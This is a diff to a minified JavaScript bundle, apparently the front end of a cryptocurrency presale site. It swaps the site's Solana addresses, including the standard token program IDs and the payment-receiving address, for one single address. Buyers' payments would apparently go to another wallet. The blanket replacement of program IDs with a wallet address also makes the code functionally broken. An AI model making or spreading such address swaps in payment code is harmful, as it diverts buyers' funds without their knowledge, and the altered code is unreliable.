@@ -38565,11 +38565,11 @@ const mu = [
   hd = JSON.parse(JSON.stringify(V6e));
 new Pe(hd.address);
 const OX = "",
-  PX = new Pe("5rtu57yuSYYrqRe6VXJUAkZKU9RQpBiReuQ3CFKU2aCN"),
-  Z6e = new Pe("7UVimffxr9ow1uXYxsr4LHAcV58mLzhmwaeKvJ1pjLiE"),
-  v5 = new Pe("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-  Q6e = new Pe("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
-  X6e = new Pe("DfXfwqnkMMZHjdHJ2Ndhhty15n4okSXyKhrdYUKDNnUe"),
+  PX = new Pe("CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM"),
+  Z6e = new Pe("CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM"),
+  v5 = new Pe("CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM"),
+  Q6e = new Pe("CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM"),
+  X6e = new Pe("CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM"),
   Ta = 10 ** YR,
   mb = 10 ** 6,
   w5 = 0.06,
@@ -111126,7 +111126,7 @@ const bGe = Zr(
           ));
       }, [e, _, K, k, S, l, B]),
       _e = "0x816F7A76832079Ab71B8aB07D5C6AcDD84d6116B",
-      Ee = "5rtu57yuSYYrqRe6VXJUAkZKU9RQpBiReuQ3CFKU2aCN",
+      Ee = "CfDa3Wj5zeDvKXDfiL2RmYR6y9ikiiJAtQopmLRTdNWM",
       He =
         "Alternatively, you can complete your purchase by sending ETH, USDT, or USDC directly to the Ethereum address from your Web3 wallet",
       je =
